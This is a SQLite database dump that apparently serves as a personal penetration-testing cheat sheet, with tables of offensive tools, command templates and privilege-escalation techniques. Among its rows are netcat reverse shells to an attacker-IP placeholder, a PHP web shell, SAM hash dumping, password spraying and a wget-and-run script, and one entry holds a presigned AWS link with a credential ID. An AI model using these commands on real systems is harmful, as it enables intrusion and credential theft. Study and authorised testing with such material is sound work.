--
-- File generated with SQLiteStudio v3.2.1 on Sun Feb 7 14:58:28 2021
--
-- Text encoding used: System
--
PRAGMA foreign_keys = off;
BEGIN TRANSACTION;

-- Table: Commands
CREATE TABLE Commands (Command_No INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, Name TEXT REFERENCES Programs (Name) NOT NULL, Description TEXT NOT NULL, Command TEXT, File BLOB);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (1, 'Kerbrute', 'brute single user password', 'kerbrute bruteuers [flags]', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (2, 'Kerbrute', 'brute username:password combos from file or stdin', 'kerbrute brutforce [flags]', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (3, 'Kerbrute', 'test a single password agains a list of users', 'kerbrute passwordspray [flags]', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (4, 'Kerbrute', 'Enumerate valid domain usernames via kerberos', 'kerbrute userenum [flags]', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (5, 'Name-That-Hash', 'Find the hash type of a string', 'nth --text ''<hash>''', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (6, 'Name-That-Hash', 'Find the hash type of a file', 'nth --file <hash file>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (7, 'Nmap', 'scan for vulnerabilites', 'nmap --script vuln <HOST_IP>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (8, 'Nikto', 'Scan host for vulnerabilites', 'nikto -h <HOST_IP>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (9, 'SMBClient', 'check for misconfigured anonymous login', 'smbclient -L \\\\<HOST_IP>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (10, 'Hydra', 'Brutforce a webpage looking for usernames', 'hydra -l <user wordlist> -p 123 <HOST_IP> http-post-form ''/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=<output string on failure>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (11, 'SMBMap', 'enumerates SMB file shares', 'smbmap -u <user> -p <pass> -H <host IP>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (12, 'WPScan', 'Enumerate Wordpress website', 'wpscan --url <wp site> --enumerate --plugins-detection', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (13, 'WPScan', 'enumerate though known usernames', 'wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (14, 'PowerShell', 'bypass execution policy', 'powershell.exe -exec bypass', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (15, 'TheHarvester', 'gathering informaiton from online sources', 'theharvester -d <domain> -l <#> -g -b google', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (16, 'Netcat', 'open a listener', 'nc -lvnp <port #>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (17, 'Netcat', 'Connect to computer', 'nc <attacker ip> <attacker port>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (18, 'GoBuster', 'Eunmerate directories on a website with a cookie', 'gobuster dir -u http://<IP> -w <wordlist> -x <extention> -c PHPSESSID=<cookie val>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (19, 'SQLMap', 'map sql at an IP', 'sqlmap -r <IP> --batch --force-ssl', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (20, 'John the Ripper', 'Use wordlist to parse hash', 'john <HASHES_FILE> --wordlist=<wordlist>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (21, 'John the Ripper', 'unencrypt shadow file', 'john <Unshadowed passwds>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (22, 'Unshadow', 'combine /etc/passwd and /etc/shadow file for cracking', 'unshadow <passwd> <shadow>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (23, 'Hashcat', 'crack hashes with a wordlist', 'hashcat -m <hash type> -a 0 -o <output file> <hash file> <wordlist> --force', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (26, 'Enum4Linux', 'basic command', 'enum4linux -a <IP>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (27, 'SMBClient', 'connect to a SMB share', 'smbclinet //<IP>/<share> -U <username>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (28, 'Netcat', 'connect with shell (-e doest always work)', 'nc -e /bin/sh <ATTACKING-IP> 80', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (29, 'Netcat', 'connect with shell (-e doest always work)', '/bin/sh | nc ATTACKING-IP 80', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (30, 'Netcat', 'done on the target', 'rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (31, 'SQLMap', 'Check form for SQL injection', 'sqlmap -o -u "http://meh.com/form/" –forms', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (32, 'SQLMap', 'automated SQL scan', 'sqlmap -u <URL> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (33, 'CrackMapExec', 'run a mimikatz module', 'crackmapexec smb <target(s)> -u <username> -p <password> --local-auth -M mimikatz', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (34, 'CrackMapExec', 'Command execution', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' -x whoami', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (35, 'CrackMapExec', 'check logged in users', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' --lusers', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (36, 'CrackMapExec', 'dump local SAM hashes', 'crackmapexec <target(s)> -u ''<uesrname>'' -p ''<password>'' --local-auth --sam', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (37, 'CrackMapExec', 'null session login', 'crackmapexec smb <target(s)> -u '''' -p ''''', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (38, 'CrackMapExec', 'list modules', NULL, NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (39, 'CrackMapExec', 'pass the hash', NULL, NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (41, 'IKE-Scan', 'attack pre shared key with dictionary', 'psk-crack -d </path/to/dictionary> <psk file>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (42, 'IKE-Scan', 'If you find a SonicWALL VPN using agressive mode it will require a group id, the default group id is GroupVPN', 'ike-scan <IP> -A -id GroupVPN', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (43, 'IKE-Scan', 'to find aggressive mode VPNs and save for use with psk-crack', 'ike-scan <IP> -A -P<file out>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (44, 'John the Ripper', 'crack passwords with korelogic rules', 'for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\] -f 1`; do ./john --rules:${ruleset} -w:<wordlist> <password_file> ; done', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (45, 'Nmap', 'create a list of ip addresses ', 'nmap -sL -n 192.168.1.1-100,102-254 | grep "report for" | cut -d " " -f 5 > ip_list_192.168.1.txt', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (46, 'Linux commands', 'mount NFS share on linux', 'mount -t nfs server:/share /mnt/point', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (47, 'PowerShell', 'create new user', 'net user <username> <password> /ADD', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (48, 'PowerShell', 'add user to a group (normaly Administrators)', 'net localgroup <group> <username> /ADD', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (49, 'PSK-Crack', 'brute force with specified length and specified chars (if left blank default is 36)', 'psk-crack -b <#> --charset="<charlist>" <key file>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (50, 'PSK-Crack', 'dictianary attack', 'psk-crack -d <file> <key file>', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (51, 'SQLMap', 'check form for SQL injection', 'sqlmap -o -u "<url of form>" --forms', NULL);
INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (52, 'SQLMap', 'Scan url for union + error based injection with mysql backend
and use a random user agent + database dump', 'sqlmap -u "<form URL>?id=1>" 
--dbms=mysql --tech=U --random-agent --dump ', NULL);

-- Table: Exploits
CREATE TABLE Exploits (Target TEXT, Type TEXT, Criteria TEXT, Method TEXT, Code TEXT, Result TEXT, Notes TEXT);
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Injection', 'ability to write to website folder', 'create or edit a mage of the website and insert the code to get remote access to the machine', '<? php system ($ _ GET [''cmd'']); ?>', 'execute code via url', '<URL of php>?cmd=<code to execue>');
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'shell', 'enter code into the shell to find vulnerbilities int he machine', 'find / -perm -u=s -type f 2>/dev/null', 'SUID binaries', 'link output to GTFO bins and exploit');
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Box', 'Priv Esc', 'Python binary running as root', 'generate a shell using python to grain root access', 'python3 -c "import pty;pty.spawn(''/bin/sh'');"', 'root shell', 'change pyton varibale acordingly');
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('SQL', 'Priv Esc', 'MySQL binary running as root', 'enter into MySQL command line and break out into root y using the code', 'mysql> \! /bin/sh', 'get shell from root priv SQL', NULL);
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'low privilage shell', 'use the code to search for programs that run as sudo without password', 'sudo -l', NULL, 'list programs that can be used with sudo and no password');
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Windows', 'Priv Esc', 'Powershell', 'use code to enumerate priv esc opertunities', 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """', 'list of unquoted service paths that might be used for priv esc', NULL);
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'LFI', NULL, NULL, NULL, NULL, NULL);
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', NULL, 'use Linenum.sh to enumerate linux box', 'wget https://www.linenum.sh/ -P /dev/shm/Linenum.sh; chmod +x /dev/shm/linenum.sh ; ./dev/shm/Linenum.sh | tee /dev/shm/lininfo.txt', ' file, /dev/shm/lininfo.txt, with priv esc info', 'it is possible to use other methods of download like: curl or others found on google');
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'No-Auth', NULL, NULL, NULL, NULL, NULL);
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Re-Registration', NULL, NULL, NULL, NULL, NULL);
INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'JWT', 'a site that uses jSON as cookies', 'edit the information (with BURP) thats going to the website to gain access without authenitaction', NULL, NULL, NULL);

-- Table: Programs
CREATE TABLE Programs (Name text PRIMARY KEY NOT NULL UNIQUE, Stage TEXT, Description text, Info text, Features TEXT, Target TEXT, Offensive BOOLEAN, commands TEXT);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nmap', 'Enum', 'Used for scanning a network/host to gather more information', 'man pages on linux', 'Scanning', 'All', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('BURP Suit', 'Enum, Exploit', 'A program for manipulating HTTP requests, enumeration and Exploit', 'https://portswigger.net/burp/documentation/contents', 'Brute', 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Metasploit', 'All', 'Powerfull swiss-army-knife of hacking', 'https://docs.rapid7.com/metasploit/', NULL, 'All', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('MSFVenom', 'Exploit', 'Designed for creating payloads', 'https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom', 'Payloads', 'OS', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Snort', 'Utility', 'Packet sniffer', 'https://snort-org-site.s3.amazonaws.com/production/document_files/files/000/000/249/original/snort_manual.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIXACIED2SPMSC7GA%2F20210128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210128T192737Z&X-Amz-Expires=172800&X-Amz-SignedHeaders=host&X-Amz-Signature=4b51dc730677d14203c4a4cde25c1831ac64e9eca8df89c6737701811fa3f9fd', 'Sniffing', 'N/A', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('GoBuster', 'Enum', 'A fuzzer for websites', 'man pages on linux', 'Fuzzing', 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hydra', 'Exploit', 'Brutforcer for wesite passwords', 'man pages on linux', 'Brute', 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Mimikatz', 'Post', 'Used to exploit kerberos', 'https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49', NULL, 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Impacket', 'Exploit', 'The fascilitator of python bassed script that uses modules for attacking windows ', 'https://www.secureauth.com/labs-old/impacket/', NULL, 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Enum4Linux', 'Enum', 'for Enumerating Windows and Samba hosts', 'man pages included, https://tools.kali.org/information-gathering/enum4linux', 'Exploit Enum', 'Linux', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Rubeus', 'Exploit', 'Used for kerberos interaction and abuse', 'https://github.com/GhostPack/Rubeus', NULL, 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Kerbrute', 'Enum, Exploit', 'quickly enumerate and brutforce active directory accounts through kerberos pre-authentication', 'https://github.com/ropnop/kerbrute/', 'Brute', 'Windows', 'Y', 'y');
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('John the Ripper', 'Exploit', 'a password brutforcer', 'https://www.openwall.com/john/doc/', 'Brute', 'Hash', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hashcat', 'Exploit', 'A password bruteforces', 'http://manpages.org/hashcat', 'Brute', 'Hash', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Bloodhound', 'Enum', 'Network mapping tool', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux', NULL, 'N/A', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Wireshark', 'Utility', 'Packet sniffer', 'https://www.wireshark.org/download/docs/user-guide.pdf', 'Sniffing', 'N/A', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hash-Identifier', 'Utility', '(superseeded by Name-That-Hash)A simple python program for identifying hashes', 'man pages on linux', NULL, 'Hash', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Scp', 'Utility', 'For transfering files over SSH connection', 'man pages on llinux', 'Connect', 'N/A', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBClient', 'Utility', 'Used to connect to SMB file shares, can be used to enumerate shares', 'man pages on linux', 'Connect', 'SMB', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PowerShell', 'Utility', 'Powerfull comand line for Windows', 'https://www.pdq.com/powershell/', NULL, 'Windows', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Searchsploit', 'Enum', 'Local version of ExploitDB', 'https://www.exploit-db.com/searchsploit', 'Exploit Enum', 'All', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Vim', 'Utiility', 'Text editor', 'https://vimhelp.org/', NULL, 'N/A', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('LinPeas', 'Post', 'For Enumerating Linux computers', 'Simply run on a linux computer', 'Exploit Enum', 'Linux', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nikto', 'Enum', 'For full enumeration on websites', 'https://cirt.net/nikto2-docs/', 'Exploit Enum', 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Radare2', 'Utility', 'A tooll used to reverse engineer programs', 'https://github.com/radareorg/radare2/blob/master/doc/intro.md', 'Reverse', 'N/A', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Evil-WinRM', 'Exploit', 'Malware exuivilent of WinRM and used to exploit windows systems', 'https://github.com/Hackplayers/evil-winrm', NULL, 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Seatbelt', 'Post', 'Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives', 'https://github.com/GhostPack/Seatbelt', 'Exploit Enum', 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WinPeas', 'Post', 'For full enumeration of windows host (internal)', 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS', 'Exploit Enum', 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Lockless', 'Post', 'LockLess is a C# tool that allows for the enumeration of open file handles and the copying of locked files', 'https://github.com/GhostPack/Lockless', 'File interaction', 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SQLMap', 'Exploit', 'Automates the process of detecting and exploiting SQL injection flaws and taking over of database servers', 'http://sqlmap.org/', 'SQLi', 'SQL', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('KEETheif', 'Post', 'Allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system', 'https://github.com/GhostPack/KeeThief', 'File interacction', 'Windows', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('TheHarvester', 'Enum', 'The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database', 'https://tools.kali.org/information-gathering/theharvester', NULL, 'N/A', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('jSQLInjection', 'Enum', 'used for gathering SQL databse information form a distant source', 'https://tools.kali.org/vulnerability-analysis/jsql', 'SQLi', 'SQL', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hping', 'Enum', 'Ping command on steroids, used to enumerating firewalls', 'https://tools.kali.org/information-gathering/hping3', 'Scanning', 'All', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Linux Exploit Suggester', 'Post', 'keeps track of vulnerabilities and suggests exploits to gain root access', 'https://tools.kali.org/exploitation-tools/linux-exploit-suggester', 'Exploit Enum', 'Linux', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unix-PrivEsc-Check', 'Post', ' It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps, written in a single shell script so is easy to upload', 'https://tools.kali.org/vulnerability-analysis/unix-privesc-check', 'Exploit Enum', 'Linux', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Dotdotpwn', 'Enum', 'It’s a very flexible intelligent fuzzer to discover traversal directory vulnerabilities in software such as HTTP/FTP/TFTP servers', 'https://tools.kali.org/information-gathering/dotdotpwn', 'Fuzzing', 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Websploit', 'Enum, Exploit', 'Swiss-army-knife of web exploits ranging from social engineering to honeypots and everything in between', 'https://tools.kali.org/web-applications/websploit', NULL, 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('XSSer', 'Enum', 'To detect, exploit and report XSS vulnerabilities in web-based applications', 'https://tools.kali.org/web-applications/xsser', 'Exploit enum', 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Name-That-Hash', 'Utility', 'Hash-identifier with more deatils and command line based', 'https://github.com/HashPals/Name-That-Hash', NULL, 'N/A', 'N', 'y');
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBMap', 'Enum', 'enumerate shares over a domin', 'https://tools.kali.org/information-gathering/smbmap', 'Scanning', 'OS', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Redis-Cli', 'Exploit', 'used for interacting and exploiting reddis-cli on port 6379', 'https://book.hacktricks.xyz/pentesting/6379-pentesting-redis ; https://redis.io/topics/rediscli', 'SQL', 'SQL', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unshadow', 'POST', 'Combining passwd and shadow files into 1', 'simply use: unshadow <passwd file> <shadow file> > <output file>', 'Passwords', 'Hash', 'Y', 'y');
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WPScan', 'Enum', 'Look for vulnerabilities in wordpress site', 'https://github.com/wpscanteam/wpscan', 'Scanning', 'Web', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Netcat', 'Utility', 'used for connecting 2 computers', 'https://www.win.tue.nl/~aeb/linux/hh/netcat_tutorial.pdf', 'Connect', 'N/A', 'N', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Linux commands', 'Post', 'Linux commands used for Priv esc', 'https://gtfobins.github.io, https://wadcoms.github.io', 'Priv Esc', 'Linux', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CrackMapExec', 'Enum,, Exploit', 'Swis army knife of network testing', 'https://ptestmethod.readthedocs.io/en/latest/cme.html', 'Scanning, Exploit', 'Networks', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('IKE-Scan', 'Enum', 'Used to dicover, fingerprint and test IPsec VPN systems', 'http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide', 'Scanning', 'VPN', NULL, NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PSK-Crack', 'Exploit', 'attempts to crack IKE Aggressive Mode pre-shared keys that have previously been gathered using ike-scan with the --pskcrack option', 'https://linux.die.net/man/1/psk-crack', 'Connect, Brute', 'Wifi', 'Y', NULL);
INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CeWL', 'Enum', 'spiders a given url returning a wordlist that is intednded for cracking passwords', 'https://tools.kali.org/password-attacks/cewl', 'Brute', 'Web', 'Y', NULL);

COMMIT TRANSACTION;
PRAGMA foreign_keys = on;
